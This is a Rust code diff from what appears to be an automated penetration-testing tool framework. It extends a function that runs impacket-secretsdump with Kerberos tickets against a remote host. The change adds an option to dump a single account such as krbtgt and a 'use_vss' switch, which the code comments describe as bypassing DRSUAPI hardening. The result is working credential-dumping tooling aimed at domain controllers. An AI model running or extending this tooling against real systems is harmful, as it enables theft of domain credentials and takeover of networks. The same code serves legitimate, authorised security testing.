@@ -261,7 +261,9 @@ pub async fn ssh_with_password(args: &Value) -> Result<ToolOutput> {
 /// Dump secrets from a remote host via impacket-secretsdump with Kerberos auth.
 ///
 /// Required args: `target`, `username`, `domain`, `ticket_path`
-/// Optional args: `dc_ip`, `target_ip`, `timeout_minutes`
+/// Optional args: `dc_ip`, `target_ip`, `timeout_minutes`,
+///                `just_dc_user` (single account, e.g. `krbtgt`),
+///                `use_vss` (bool — use VSS method to bypass DRSUAPI hardening)
 pub async fn secretsdump_kerberos(args: &Value) -> Result<ToolOutput> {
     let target = required_str(args, "target")?;
     let username = required_str(args, "username")?;
@@ -269,22 +271,28 @@ pub async fn secretsdump_kerberos(args: &Value) -> Result<ToolOutput> {
     let ticket_path = required_str(args, "ticket_path")?;
     let dc_ip = optional_str(args, "dc_ip");
     let target_ip = optional_str(args, "target_ip");
+    let just_dc_user = optional_str(args, "just_dc_user");
+    let use_vss = crate::args::optional_bool(args, "use_vss").unwrap_or(false);
     let timeout_minutes = optional_i64(args, "timeout_minutes").unwrap_or(3);
     let timeout_secs = (timeout_minutes * 60) as u64;
 
     let target_str = format!("{domain}/{username}@{target}");
     let (env_key, env_val) = credentials::kerberos_env(ticket_path);
 
-    CommandBuilder::new("impacket-secretsdump")
+    let mut cmd = CommandBuilder::new("impacket-secretsdump")
         .arg("-k")
         .arg("-no-pass")
         .arg(&target_str)
         .flag_opt("-dc-ip", dc_ip)
         .flag_opt("-target-ip", target_ip)
-        .env(env_key, env_val)
-        .timeout_secs(timeout_secs)
-        .execute()
-        .await
+        .flag_opt("-just-dc-user", just_dc_user)
+        .env(env_key, env_val);
+
+    if use_vss {
+        cmd = cmd.arg("-use-vss");
+    }
+
+    cmd.timeout_secs(timeout_secs).execute().await
 }
 
 #[cfg(test)]
